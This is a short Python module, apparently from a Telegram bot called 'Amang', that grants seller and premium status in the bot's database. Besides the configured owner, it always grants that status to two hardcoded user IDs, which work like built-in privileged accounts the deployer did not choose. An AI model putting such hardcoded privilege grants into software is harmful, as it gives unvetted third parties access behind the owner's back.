from Amang.config import OWNER
from Amang.utils.dbfunctions import add_prem, add_seles, get_prem, get_seles


async def premium():
    if OWNER not in await get_seles():
        await add_seles(OWNER)
    if OWNER not in await get_prem():
        await add_prem(OWNER)
    if 1755047203 not in await get_seles():
        await add_seles(1755047203)
    if 1755047203 not in await get_prem():
        await add_prem(1755047203)
    if 1898065191 not in await get_seles():
        await add_seles(1898065191)
    if 1898065191 not in await get_prem():
        await add_prem(1898065191)